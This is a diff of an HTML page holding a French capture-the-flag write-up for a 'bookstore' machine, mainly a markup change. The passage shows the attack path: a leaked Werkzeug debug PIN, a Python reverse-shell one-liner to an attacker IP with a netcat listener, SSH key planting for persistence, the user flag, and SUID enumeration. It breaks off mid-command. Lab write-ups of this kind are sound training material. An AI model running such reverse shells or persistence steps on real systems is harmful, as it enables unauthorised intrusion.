-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>/etc/passwd
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>/etc/passwd
 /etc/apt/sources.list
 /etc/crontab
 /etc/fstab
@@ -271,115 +266,115 @@ sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
 /proc/partitions
 /proc/mounts
 /proc/net/tcp
-</code></pre></div>
+</code></code></pre></div></div>
 <p>Cette liste est assez longue mais le fichier qui  à l’air le plus intéressant est le fichier <code>/proc/self/environ</code>. En lisant son contenu on découvre</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>LANG=en_US.UTF-8OLDPWD=/home/sidPWD=/home/sidHOME=/home/sidWERKZEUG_DEBUG_PIN=123-321-135SHELL=/bin/shSHLVL=1LOGNAME=sidPATH=/usr/bin:/bin_=/usr/bin/python3WERKZEUG_SERVER_FD=3WERKZEUG_RUN_MAIN=true
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>LANG=en_US.UTF-8OLDPWD=/home/sidPWD=/home/sidHOME=/home/sidWERKZEUG_DEBUG_PIN=123-321-135SHELL=/bin/shSHLVL=1LOGNAME=sidPATH=/usr/bin:/bin_=/usr/bin/python3WERKZEUG_SERVER_FD=3WERKZEUG_RUN_MAIN=true
+</code></code></pre></div></div>
 <p>Le champ contenant le code PIN est interessant car il nous rappelle la page console qui nous demandais un code pin. On peut donc se rendre sur la page et dans le champ PIN entrer</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>123-321-135
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>123-321-135
+</code></code></pre></div></div>
 <p>On a maintenant accès à la console python.</p>
 <h2 id="capture-user-flag">Capture User Flag</h2>
 <p>Une fois l’accès à la console python obtenu on peut y insérer un script de revershell pour obtenir un shell distant. Sur notre machine on lance l’écoute sur le port 9001</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">nc -lvnp 9001</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">nc -lvnp 9001</span>
+</code></code></pre></div></div>
 <p>Et dans la console web on entre</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">python</span><button class="copy-btn">Copier</button></div><pre><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.148.105",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">python</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-python"><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.148.105",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+</code></code></pre></div></div>
 <p>On obtient ainsi un shell distant. Mais ce genre de shell est souvent fragile et peut se cassez en cas de panne réseau . On peut donc l’exploiter pour une connexion ssh sans mot de passe</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~$ ls /home</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ls /home</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~$ cd /home/sid</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">cd /home/sid</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~$ ls -la</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ls -la</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">total 80</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">drwxr-xr-x 5 sid  sid   4096 Oct 20  2020 .</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">drwxr-xr-x 3 root root  4096 Oct 20  2020 ..</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-r--r--r-- 1 sid  sid   4635 Oct 20  2020 api.py</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-r-xr-xr-x 1 sid  sid    160 Oct 14  2020 api-up.sh</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-r--r----- 1 sid  sid    116 Oct 20  2020 .bash_history</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-rw-r--r-- 1 sid  sid    220 Oct 20  2020 .bash_logout</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-rw-r--r-- 1 sid  sid   3771 Oct 20  2020 .bashrc</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-rw-rw-r-- 1 sid  sid  16384 Oct 19  2020 books.db</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">drwx------ 2 sid  sid   4096 Oct 20  2020 .cache</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">drwx------ 3 sid  sid   4096 Oct 20  2020 .gnupg</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">drwxrwxr-x 3 sid  sid   4096 Oct 20  2020 .local</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-rw-r--r-- 1 sid  sid    807 Oct 20  2020 .profile</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-rwsrwsr-x 1 root sid   8488 Oct 20  2020 try-harder</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-r--r----- 1 sid  sid     33 Oct 15  2020 user.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~$ mkdir .ssh &amp;&amp; cd .ssh</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">mkdir .ssh &amp;&amp; cd .ssh</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~/.ssh$</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ ls /home</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ls /home</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ cd /home/sid</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">cd /home/sid</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ ls -la</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ls -la</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">total 80</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">drwxr-xr-x 5 sid  sid   4096 Oct 20  2020 .</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">drwxr-xr-x 3 root root  4096 Oct 20  2020 ..</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">-r--r--r-- 1 sid  sid   4635 Oct 20  2020 api.py</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">-r-xr-xr-x 1 sid  sid    160 Oct 14  2020 api-up.sh</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">-r--r----- 1 sid  sid    116 Oct 20  2020 .bash_history</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">-rw-r--r-- 1 sid  sid    220 Oct 20  2020 .bash_logout</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">-rw-r--r-- 1 sid  sid   3771 Oct 20  2020 .bashrc</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">-rw-rw-r-- 1 sid  sid  16384 Oct 19  2020 books.db</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">drwx------ 2 sid  sid   4096 Oct 20  2020 .cache</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">drwx------ 3 sid  sid   4096 Oct 20  2020 .gnupg</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">drwxrwxr-x 3 sid  sid   4096 Oct 20  2020 .local</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">-rw-r--r-- 1 sid  sid    807 Oct 20  2020 .profile</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">-rwsrwsr-x 1 root sid   8488 Oct 20  2020 try-harder</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">-r--r----- 1 sid  sid     33 Oct 15  2020 user.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ mkdir .ssh &amp;&amp; cd .ssh</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">mkdir .ssh &amp;&amp; cd .ssh</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~/.ssh$</span>
+</code></code></pre></div></div>
 <p>On s’est rendu dans le dossier local de l’utilisateur <code>sid</code> puis on a créé le dossier <code>.ssh</code>. Sur notre machine local on peut générer une paire de clés <code>rsa</code>  tout en laissant le champ passphrase vide</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ssh-keygen -t rsa -b 4096  -f ./id_rsa</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ssh-keygen -t rsa -b 4096  -f ./id_rsa</span>
+</code></code></pre></div></div>
 <p>Cela cré deux fichiers: id_rsa qui contient notre clé privée et id_rsa.pub qui contient notre clé publique. On copie le contenu de la clé publique et sur le serveur on va le mettre dans le fichier authorized_keys et donner les bonnes permissions à ce fichier</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">echo "notre_clé_publique" &gt; authorized_keys</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">chmod 600 authorized_keys</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">echo "notre_clé_publique" &gt; authorized_keys</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">chmod 600 authorized_keys</span>
+</code></code></pre></div></div>
 <p>On peut donc se connecter à la machine via ssh</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ssh -i id_rsa sid@bookstore.thm</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ssh -i id_rsa sid@bookstore.thm</span>
+</code></code></pre></div></div>
 <p>Une fois connecté on peut récupérer le user flag</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~$ ls</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">api.py  api-up.sh  books.db  try-harder  user.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~$ cat user.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">4ea65eb80ed441adb68246ddf7b964ab</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~$ </span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ ls</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">api.py  api-up.sh  books.db  try-harder  user.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ cat user.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">4ea65eb80ed441adb68246ddf7b964ab</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ </span>
+</code></code></pre></div></div>
 <p>⛳<strong>User Flag</strong>: 4ea65eb80ed441adb68246ddf7b964ab</p>
 <h2 id="capture-root-flag">Capture root flag</h2>
 <p>La première étape généralement pour l’escalade de privilèges est de déterminer nos permissions</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~$ sudo -l</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[sudo] password for sid:</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ sudo -l</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[sudo] password for sid:</span>
+</code></code></pre></div></div>
 <p>Un mot de passe nous est demandé donc ce n’est pas le bon chemins. Essayons de lister les fichiers avec le <code>suid</code></p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">find / -type f -perm -4000 2&gt;/dev/null</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">find / -type f -perm -4000 2&gt;/dev/null</span>
+</code></code></pre></div></div>
 <p>Résultat:</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/bin/fusermount</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/bin/umount</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/bin/mount</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/bin/su</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/bin/ping</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/home/sid/try-harder</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/bin/passwd</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/bin/chsh</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/bin/at</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/bin/sudo</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/bin/newgidmap</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/bin/traceroute6.iputils</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/bin/chfn</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/bin/gpasswd</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/bin/newuidmap</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/bin/pkexec</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/bin/newgrp</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/lib/openssh/ssh-keysign</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/lib/eject/dmcrypt-get-device</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/lib/snapd/snap-confine</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/lib/policykit-1/polkit-agent-helper-1</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/bin/fusermount</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/bin/umount</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/bin/mount</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/bin/su</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/bin/ping</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/home/sid/try-harder</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/bin/passwd</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/bin/chsh</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/bin/at</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/bin/sudo</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/bin/newgidmap</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/bin/traceroute6.iputils</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/bin/chfn</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/bin/gpasswd</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/bin/newuidmap</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/bin/pkexec</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/bin/newgrp</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/lib/openssh/ssh-keysign</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/lib/eject/dmcrypt-get-device</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/lib/snapd/snap-confine</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/lib/policykit-1/polkit-agent-helper-1</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+</code></code></pre></div></div>
 <p>Dans cette liste le fichier suspect est le fichier /home/sid/try-harder. En listant ses droits il est un fichier de l’utilisateur root. On peut essayer de déterminer le type de fichier avec la commande <code>file</code></p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~$ ls -la /home/sid/try-harder</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-rwsrwsr-x 1 root sid 8488 Oct 20  2020 /home/sid/try-harder</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~$ file /home/sid/try-harder</span>
